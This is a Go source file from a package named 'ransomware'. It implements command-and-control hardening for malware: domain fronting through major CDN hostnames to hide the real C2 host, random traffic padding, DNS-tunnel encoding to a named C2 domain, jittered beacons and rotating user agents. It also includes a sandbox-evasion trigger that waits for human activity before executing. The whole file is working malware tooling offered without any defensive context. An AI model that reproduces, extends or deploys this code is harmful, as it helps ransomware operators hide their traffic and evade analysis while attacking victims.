package ransomware

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base32"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"strings"
	"time"
)

// C2Hardener adds domain fronting, traffic padding, and multiple transport channels.
type C2Hardener struct {
	frontDomain string
	realHost    string
	cdns        []string
	jitterBase  time.Duration
	maxJitter   time.Duration
}

func NewC2Hardener(realHost string) *C2Hardener {
	return &C2Hardener{
		frontDomain: "www.cloudflare.com",
		realHost:    realHost,
		cdns: []string{
			"www.cloudflare.com",
			"www.fastly.com",
			"ajax.googleapis.com",
			"cdn.jsdelivr.net",
		},
		jitterBase: 30 * time.Second,
		maxJitter:  25 * time.Second,
	}
}

func (ch *C2Hardener) RandomFrontDomain() string {
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(ch.cdns))))
	return ch.cdns[idx.Int64()]
}

func (ch *C2Hardener) DialWithFronting(ctx context.Context) (net.Conn, error) {
	front := ch.RandomFrontDomain()
	addr := ch.realHost

	dialer := &net.Dialer{Timeout: 10 * time.Second}
	config := &tls.Config{
		ServerName: front,
		MinVersion: tls.VersionTLS12,
	}

	if _, port, err := net.SplitHostPort(addr); err == nil {
		return tls.DialWithDialer(dialer, "tcp", fmt.Sprintf("%s:%s", front, port), config)
	}
	return tls.DialWithDialer(dialer, "tcp", front+":443", config)
}

func (ch *C2Hardener) HTTPGetWithFronting(ctx context.Context, path string) (*http.Response, error) {
	front := ch.RandomFrontDomain()
	url := fmt.Sprintf("https://%s%s", front, path)

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, err
	}

	req.Host = ch.realHost
	req.Header.Set("User-Agent", randomUserAgent())
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Cache-Control", "no-cache")

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			ServerName:         front,
			MinVersion:         tls.VersionTLS12,
			InsecureSkipVerify: false,
		},
		DialContext: (&net.Dialer{Timeout: 10 * time.Second}).DialContext,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Second,
	}

	return client.Do(req)
}

func (ch *C2Hardener) AddRandomPadding(data []byte) []byte {
	n, _ := rand.Int(rand.Reader, big.NewInt(4096))
	padSize := int(n.Int64())
	padding := make([]byte, padSize)
	rand.Read(padding)

	buf := make([]byte, 2+padSize+len(data))
	buf[0] = byte(padSize >> 8)
	buf[1] = byte(padSize & 0xFF)
	copy(buf[2:2+padSize], padding)
	copy(buf[2+padSize:], data)
	return buf
}

func (ch *C2Hardener) StripRandomPadding(data []byte) []byte {
	if len(data) < 2 {
		return data
	}
	padSize := int(data[0])<<8 | int(data[1])
	if padSize+2 > len(data) {
		return data
	}
	return data[2+padSize:]
}

func (ch *C2Hardener) DNSEncode(data []byte) string {
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	var labels []string
	for i := 0; i < len(encoded); i += 60 {
		end := i + 60
		if end > len(encoded) {
			end = len(encoded)
		}
		labels = append(labels, strings.ToLower(encoded[i:end]))
	}
	return strings.Join(labels, ".") + ".x404x-c2.online"
}

func (ch *C2Hardener) JitterSleep() {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(ch.maxJitter)))
	time.Sleep(ch.jitterBase + time.Duration(n.Int64()))
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
}

func randomUserAgent() string {
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
	return userAgents[idx.Int64()]
}

// ============================================================
// SLEEP TRIGGER — wait for human interaction before executing
// ============================================================

type SleepTrigger struct{}

func NewSleepTrigger() *SleepTrigger {
	return &SleepTrigger{}
}

func (st *SleepTrigger) WaitForHumanInteraction(ctx context.Context) error {
	maxWait := 600

	for i := 0; i < maxWait; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}
		if st.isUserActive() {
			return nil
		}
		time.Sleep(1 * time.Second)
	}
	return nil
}

func (st *SleepTrigger) isUserActive() bool {
	return isUserActiveNative()
}
